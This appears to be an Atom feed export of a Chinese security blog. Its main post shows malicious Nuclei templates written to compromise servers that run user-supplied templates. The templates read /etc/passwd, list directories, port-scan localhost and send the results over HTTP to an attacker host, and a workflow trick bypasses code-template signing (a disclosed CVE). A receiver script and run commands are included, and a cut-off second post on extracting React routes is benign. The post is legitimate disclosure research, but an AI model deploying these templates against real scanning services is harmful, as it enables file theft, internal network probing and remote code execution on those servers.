<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ovie博客</title>
  
  
  <link href="https://ovi3.github.io/atom.xml" rel="self"/>
  
  <link href="https://ovi3.github.io/"/>
  <updated>2024-07-21T13:06:42.653Z</updated>
  <id>https://ovi3.github.io/</id>
  
  <author>
    <name>Ovie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意的Nuclei模板</title>
    <link href="https://ovi3.github.io/2024/07/21/evil-nuclei-template/"/>
    <id>https://ovi3.github.io/2024/07/21/evil-nuclei-template/</id>
    <published>2024-07-21T07:08:05.000Z</published>
    <updated>2024-07-21T13:06:42.653Z</updated>
    
    <content type="html"><![CDATA[<p>最近看同事在集成<a href="https://github.com/projectdiscovery/nuclei">nuclei</a>，也看了一些集成nuclei的扫描工具，在思考一个问题：对于集成nuclei的安全工具（比如nuclei官方提供的云扫描功能），假如其允许用户编辑PoC模板，也可以指定扫描目标执行模板并查看扫描结果，那么写一个恶意的nuclei模板，是否就可以拿下这个工具的服务器？</p><p>本来以为直接用nuclei提供的<a href="https://docs.projectdiscovery.io/templates/protocols/code">code协议</a>随随便便就可以执行任意命令了，结果发现nuclei还是做了些防护的。</p><p>写了几个恶意的模板：（以下在<code>Linux</code>和<code>nuclei v3.2.9</code>版本下测试）</p><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取文件，并用http把文件内容发送出来。 （threads指定为1，让文件按行顺序发送，避免服务端接收到乱序的内容）。</p><p><code>read-file.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">read-file</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Read</span> <span class="hljs-string">File</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">§file_line§</span><br><br>    <span class="hljs-attr">payloads:</span><br>      <span class="hljs-attr">file_line:</span> <span class="hljs-string">/etc/passwd</span><br>    <span class="hljs-attr">threads:</span> <span class="hljs-number">1</span><br><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">500</span><br></code></pre></div></td></tr></table></figure><p>用python flask框架写个简单的web服务接收文件内容：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> logging<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/re&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_route</span>():<br>    <span class="hljs-built_in">print</span>(request.get_data(as_text=<span class="hljs-literal">True</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok.&#x27;</span>, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p>执行模板：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./read-file.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>可惜nuclei做了防护，默认只能读template所在的目录下的文件，要读其他文件需要加上这个选项：</p><figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">-lfa, -allow-<span class="hljs-keyword">local</span>-<span class="hljs-keyword">file</span>-<span class="hljs-keyword">access</span>   allows <span class="hljs-keyword">file</span> (payload) <span class="hljs-keyword">access</span> anywhere on the system<br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./read-file.yaml -u http://ip -lfa<br></code></pre></div></td></tr></table></figure><p>就能读到文件了，读取了<code>/etc/passwd</code>文件，再发送文件内容给<code>http://ip</code>。</p><h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><p>列目录，并用http把文件列表发送出来。</p><p><code>list-dir.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">list-dir</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">List</span> <span class="hljs-string">Dir</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">flow:</span> <span class="hljs-string">|</span><br><span class="hljs-string">  javascript();</span><br><span class="hljs-string">  set(&#x27;items&#x27;, template[&quot;javascript_response&quot;])</span><br><span class="hljs-string">  http();</span><br><span class="hljs-string"></span><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      let m = require(&#x27;nuclei/fs&#x27;);</span><br><span class="hljs-string">      let items = m.ListDir(&#x27;/etc/&#x27;);</span><br><span class="hljs-string">      to_json(items)</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">items</span>&#125;&#125;<br><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">500</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./list-dir.yaml -u http://ip -lfa<br></code></pre></div></td></tr></table></figure><p>同样需要加上<code>-lfa</code>选项。</p><h2 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h2><p>执行任意代码：<code>code.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">code</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">example</span> <span class="hljs-string">code</span> <span class="hljs-string">template</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br><br><span class="hljs-attr">code:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sh</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">bash</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      id</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">code_response</span>&#125;&#125;<br><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t code.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>报错：<code>Excluded 1 code template[s] (disabled as default), use -code option to run code templates.</code> 。 加上<code>-code</code>后再执行报错：<code>Found 1 unsigned or tampered code template (carefully examine before using it &amp; use -sign flag to sign them)</code>。  也就是要执行code模板，需要加上<code>-code</code>选项并且模板文件已签名。</p><p>这儿有个方式可以绕过， 不过要用<code>-w</code>执行工作流模板文件而不是<code>-t</code>。</p><p><code>code.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">code</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">example</span> <span class="hljs-string">code</span> <span class="hljs-string">template</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br><br><span class="hljs-attr">code:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sh</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">bash</span><br>    <span class="hljs-attr">source:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      id</span><br><span class="hljs-string"></span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /re HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string"></span><br>        &#123;&#123;<span class="hljs-string">code_response</span>&#125;&#125;<br><br><span class="hljs-attr">workflows:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">matchers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">t</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -w code.yaml -u http://127.0.0.1 <br></code></pre></div></td></tr></table></figure><p>在<code>code.yaml</code>里加个<code>workflows</code>字段，假装是个工作流模板。执行时不需要<code>-code</code>和签名。该绕过已提交给nuclei官方： <a href="https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h</a> （CVE-2024-40641， 在nuclei v3.3.0修复）</p><h2 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h2><p>写法一，<code>tcp.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">tcp:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">inputs:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">data:</span> <span class="hljs-string">&quot;ABC\r\n&quot;</span><br>    <span class="hljs-attr">host:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Hostname&#125;&#125;</span>&quot;</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br><br></code></pre></div></td></tr></table></figure><p>写法二：<code>tcp2.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp2</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP2</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      const net = require(&quot;nuclei/net&quot;);</span><br><span class="hljs-string">      const conn = net.Open(&#x27;tcp&#x27;, Host + &quot;:80&quot;);</span><br><span class="hljs-string">      conn.SetTimeout(3);</span><br><span class="hljs-string">      conn.Send(&quot;ABC\r\n&quot;);</span><br><span class="hljs-string">      conn.Close()</span><br><span class="hljs-string"></span>    <span class="hljs-attr">args:</span><br>      <span class="hljs-attr">Host:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Host&#125;&#125;</span>&quot;</span><br><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t tcp.yaml -u 127.0.0.1 <br></code></pre></div></td></tr></table></figure><p>向127.0.0.1的80端口发送数据。nuclei默认是允许给内网地址发送数据的，如果想限制下，就加上这个选项：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">-lna, -restrict-<span class="hljs-built_in">local</span>-network-access  blocks connections <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">local</span> / <span class="hljs-keyword">private</span> network<br></code></pre></div></td></tr></table></figure><p>尝试用DNS ReBinding绕过<code>-lna</code>选项，不行。看了代码，是对目标域名DNS解析后，再过滤，再直接用解析的IP结果去建立连接。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF， 再通过HTTP发送回显：</p><p><code>tcp3.yaml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">tcp3</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">TCP3</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">ovi3</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">info</span><br><br><span class="hljs-attr">javascript:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">code:</span> <span class="hljs-string">|</span><br><span class="hljs-string">      for(let p of [&quot;22&quot;, &quot;80&quot;, &quot;6379&quot;])&#123;</span><br><span class="hljs-string">        const net = require(&#x27;nuclei/net&#x27;);</span><br><span class="hljs-string">        const conn = net.Open(&#x27;tcp&#x27;, &#x27;127.0.0.1:&#x27; + p);</span><br><span class="hljs-string">        conn.SetTimeout(5);</span><br><span class="hljs-string">        conn.Send(&quot;ABC\r\n&quot;);</span><br><span class="hljs-string">        const data = conn.RecvFullHex(8192);</span><br><span class="hljs-string">        conn.Close();</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">const</span> <span class="hljs-string">conn2</span> <span class="hljs-string">=</span> <span class="hljs-string">net.Open(&#x27;tcp&#x27;,</span> <span class="hljs-string">Host</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;:80&quot;</span><span class="hljs-string">);</span><br>        <span class="hljs-string">conn2.SetTimeout(5);</span><br>        <span class="hljs-string">conn2.Send(&quot;POST</span> <span class="hljs-string">/re</span> <span class="hljs-string">HTTP/1.1\r\nContent-Length:&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">(data.length</span> <span class="hljs-string">+</span> <span class="hljs-string">p.length</span> <span class="hljs-string">+</span> <span class="hljs-number">2</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">p</span> <span class="hljs-string">+</span> <span class="hljs-string">&quot;:\n&quot;</span> <span class="hljs-string">+</span> <span class="hljs-string">data);</span><br>        <span class="hljs-string">conn2.Close()</span><br>      <span class="hljs-string">&#125;</span><br>    <span class="hljs-attr">args:</span><br>      <span class="hljs-attr">Host:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;Host&#125;&#125;</span>&quot;</span><br>      <br>      <br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t ./tcp3.yaml -u http://ip<br></code></pre></div></td></tr></table></figure><p>扫描本地127.0.0.1的几个端口，若接收到TCP响应，则将响应数据发送到<code>http://ip</code>。</p><h2 id="使用file协议模板读取文件"><a href="#使用file协议模板读取文件" class="headerlink" title="使用file协议模板读取文件"></a>使用file协议模板读取文件</h2><p>上面提到nuclei默认不允许读取本地任意文件。但如果使用file协议就可以读取任意文件了，这需要满足：</p><ul><li>用户可编辑、添加模板文件</li><li>用户可执行模板并获取到扫描结果（extractor提取出来的结果）</li><li>程序未验证用户输入的目标是否是文件路径还是URL/Host。</li></ul><p><code>file.yaml</code>：</p><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span class="hljs-attr">id</span>: file<br><br><span class="hljs-attr">info</span>:<br>  <span class="hljs-attr">name</span>: file<br>  <span class="hljs-attr">author</span>: ovi3<br>  <span class="hljs-attr">severity</span>: medium<br><br><span class="hljs-attr">file</span>:<br>  - <span class="hljs-attr">extensions</span>:<br>      - all<br><br>    <span class="hljs-attr">extractors</span>:<br>      - <span class="hljs-attr">type</span>: regex<br>        <span class="hljs-attr">regex</span>:<br>          - <span class="hljs-string">&quot;(?s)^.*?$&quot;</span><br></code></pre></div></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nuclei -disable-update-check -t file.yaml -u /etc/passwd<br></code></pre></div></td></tr></table></figure><p>nuclei返回了<code>/etc/passwd</code>文件内容。</p><p>nuclei官方回复说这种方式读文件是允许的，正常设计（<code>it&#39;s expected behavior for file protocol</code>），不是安全问题。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看同事在集成&lt;a href=&quot;https://github.com/projectdiscovery/nuclei&quot;&gt;nuclei&lt;/a&gt;，也看了一些集成nuclei的扫描工具，在思考一个问题：对于集成nuclei的安全工具（比如nuclei官方提供的云扫描功能），假如</summary>
      
    
    
    
    
    <category term="安全工具" scheme="https://ovi3.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>提取React前端路由</title>
    <link href="https://ovi3.github.io/2024/03/29/extract-react-router/"/>
    <id>https://ovi3.github.io/2024/03/29/extract-react-router/</id>
    <published>2024-03-29T10:35:00.000Z</published>
    <updated>2024-07-21T05:46:47.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提取React前端路由"><a href="#提取React前端路由" class="headerlink" title="提取React前端路由"></a>提取React前端路由</h1><p>写了个脚本，用于提取使用React和react-router模块编写的页面的前端路由。脚本在<a href="https://github.com/Ovi3/extract-react-router">Github</a>上。</p><h2 id="脚本执行步骤"><a href="#脚本执行步骤" class="headerlink" title="脚本执行步骤"></a>脚本执行步骤</h2><ol><li><p>找到<code>React Container</code>：翻阅React源码，用于存储Container的属性名在不同React版本下有些不同：</p> <figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.14.0/packages/react-dom/src/client/ReactDOMComponentTree.js#L39 :</span><br><span class="hljs-keyword">const</span> internalInstanceKey = <span class="hljs-string">&#x27;__reactFiber$&#x27;</span> + randomKey;<br><span class="hljs-keyword">const</span> internalContainerInstanceKey = <span class="hljs-string">&#x27;__reactContainer$&#x27;</span> + randomKey;<br><br><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.13.1/packages/react-dom/src/client/ReactDOMComponentTree.js#L21 :</span><br><span class="hljs-keyword">const</span> internalInstanceKey = <span class="hljs-string">&#x27;__reactInternalInstance$&#x27;</span> + randomKey;<br><span class="hljs-keyword">const</span> internalContainerInstanceKey = <span class="hljs-string">&#x27;__reactContainere$&#x27;</span> + randomKey;<br><br><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/facebook/react/blob/v16.9.0/packages/react-dom/src/client/ReactDOM.js#L556 :</span><br>root = container.<span class="hljs-property">_reactRootContainer</span> = <span class="hljs-title function_">legacyCreateRootFromDOMContainer</span>(xx)<br></code></pre></div></td></tr></table></figure></li><li><p>递归遍历<code>Container</code>的属性，识别<code>Routes</code>组件或<code>RouterProvider</code>组件：</p><ul><li><code>Routes</code>组件里包裹一个或多个<code>Route</code>组件，而<code>Route</code>组件的属性见<a href="https://github.com/remix-run/react-router/blob/9e7486b89e712b765d947297f228650cdc0c488e/packages/react-router/lib/components.tsx#L385">源码</a> （React Route 版本6）， React Route 版本5的在<a href="https://github.com/remix-run/react-router/blob/v5.3.4/packages/react-router/modules/Route.js#L82">这里</a>，这两个版本的<code>Route</code>组件属性差别不大，通常就用到<code>path</code>属性和指定渲染组件的属性，<code>element</code>、<code>component</code>或<code>render</code></li><li><code>RouterProvider</code>组件的属性见<a href="https://github.com/remix-run/react-router/blob/9e7486b89e712b765d947297f228650cdc0c488e/packages/react-router/lib/components.tsx#L60">源码</a> ，这个组件是从react router 6版本开始支持的。</li></ul></li><li><p>提取路由里的路径信息，并处理嵌套路由的情况</p></li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>根据React Route官方文档编写一个标准的、用于测试的前端项目：<a href="https://github.com/Ovi3/react-router-test">https://github.com/Ovi3/react-router-test</a> 。 再全网搜索基于React的前端，去测试，修改，尽量适配、兼容多种情况。</p><p>还是会有些缺陷：</p><ol><li>该脚本只处理基于react-router-dom、react-router模块的路由， 不处理其它的，如<a href="https://github.com/BGmi/BGmi">BGmi</a>使用的 <code>@generouted/react-router</code> 库， 一些站点（<code>fofa query：title=&quot;DC Base&quot;</code>）使用 <code>@tanstack/react-location</code> 模块等。</li><li>暂未考虑一个页面里存在多个Container的情况</li><li>子路由Routes组件通过动态返回（<code>return</code>）时，获取不到该子路由信息。 （当页面渲染了该子路由组件是可以获取，该脚本未实现。 或者可通过其它方式获取？）</li></ol><p>从提取结果上看有时不如使用<code>linkfinder</code>直接正则匹配， 不过提取前端路由的优点是知道这个路径是前端路由，知道要用浏览器去访问，去渲染页面。 且知道是用url路径还是hash路径去访问。换个角度说，在<code>burpsuite</code>里爆破<code>linkfinder</code>匹配出来路径很多都响应同一个html页面时，这些路径可能就是前端路由，可以尝试用浏览器去访问看看。</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>看了几天React跟React Router，有时还不如直接运行一个递归遍历全局对象的js脚本，直接打印出可能是url路径的字符串：</p><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 